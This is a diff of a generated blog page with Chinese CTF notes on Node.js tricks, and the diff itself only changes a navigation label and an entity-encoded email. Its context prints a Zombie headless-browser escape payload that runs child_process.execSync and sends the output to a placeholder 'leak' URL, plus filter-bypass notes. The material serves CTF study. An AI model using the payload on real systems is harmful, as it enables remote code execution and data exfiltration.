@@ -73,7 +73,7 @@
      --><!--
        --><li><a href="/tags/">tags</a></li><!--
      --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">مشاريع</a></li><!--
      -->
       </ul>
     </span>
@@ -213,7 +213,7 @@
 <h3 id="2-1-3-相关题目"><a href="#2-1-3-相关题目" class="headerlink" title="2.1.3 相关题目"></a>2.1.3 相关题目</h3><h3 id="2-1-4-参考链接"><a href="#2-1-4-参考链接" class="headerlink" title="2.1.4 参考链接"></a>2.1.4 参考链接</h3><p><a target="_blank" rel="noopener" href="https://snyk.io/test/npm/safe-eval/0.3.0">https://snyk.io/test/npm/safe-eval/0.3.0</a></p>
 <h2 id="2-2-setTimeout"><a href="#2-2-setTimeout" class="headerlink" title="2.2 setTimeout()"></a>2.2 setTimeout()</h2><p>浏览器内部使用32位带符号的整数来储存推迟执行的时间,这意味着setTimeout最多延迟2147483647秒。只要大于2147483647,就会发生溢出,就可以绕过那个时间限制，进入下一个路由.	</p>
 <h2 id="2-3-Json-decode"><a href="#2-3-Json-decode" class="headerlink" title="2.3 Json_decode()"></a>2.3 Json_decode()</h2><p>json_decode有个特性就是会自动解码unicode编码。因此可以利用unicode绕过过滤</p>
-<h2 id="2-4-Zombie"><a href="#2-4-Zombie" class="headerlink" title="2.4 Zombie"></a>2.4 Zombie</h2><h3 id="2-4-1-简单描述下漏洞原理"><a href="#2-4-1-简单描述下漏洞原理" class="headerlink" title="2.4.1 简单描述下漏洞原理:"></a>2.4.1 简单描述下漏洞原理:</h3><p>在较低版本的<code>Zombie</code>中(参考链接中<a href="mailto:&#x5a;&#111;&#x6d;&#x69;&#x65;&#64;&#54;&#x2e;&#x31;&#46;&#50;">&#x5a;&#111;&#x6d;&#x69;&#x65;&#64;&#54;&#x2e;&#x31;&#46;&#50;</a>),当使用<code>Zombie</code>去爬取页面时,会执行页面的<code>js</code>代码.</p>
+<h2 id="2-4-Zombie"><a href="#2-4-Zombie" class="headerlink" title="2.4 Zombie"></a>2.4 Zombie</h2><h3 id="2-4-1-简单描述下漏洞原理"><a href="#2-4-1-简单描述下漏洞原理" class="headerlink" title="2.4.1 简单描述下漏洞原理:"></a>2.4.1 简单描述下漏洞原理:</h3><p>在较低版本的<code>Zombie</code>中(参考链接中<a href="mailto:&#x5a;&#111;&#x6d;&#x69;&#x65;&#x40;&#x36;&#x2e;&#49;&#x2e;&#50;">&#x5a;&#111;&#x6d;&#x69;&#x65;&#x40;&#x36;&#x2e;&#49;&#x2e;&#50;</a>),当使用<code>Zombie</code>去爬取页面时,会执行页面的<code>js</code>代码.</p>
 <h3 id="2-4-2-payload"><a href="#2-4-2-payload" class="headerlink" title="2.4.2 payload"></a>2.4.2 payload</h3><p>这里列出参考的两个payload:内容均放在自己的服务器上.</p>
 <p>1. </p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> out = constructor.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>)(<span class="params"></span>).<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;/readflag&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">var</span> xhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;xxx/leak?flag=&quot;</span> + <span class="built_in">encodeURIComponent</span>(out), <span class="literal">true</span>);</span><br><span class="line">    xhttp.<span class="title function_">send</span>();</span><br><span class="line">&#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
@@ -249,7 +249,7 @@
          
           <li><a href="/tags/">tags</a></li>
          
-          <li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li>
+          <li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">مشاريع</a></li>
         
       </ul>
     </div>
@@ -307,7 +307,7 @@
      --><!--
        --><li><a href="/tags/">tags</a></li><!--
      --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">مشاريع</a></li><!--
      -->
       </ul>
     </nav>
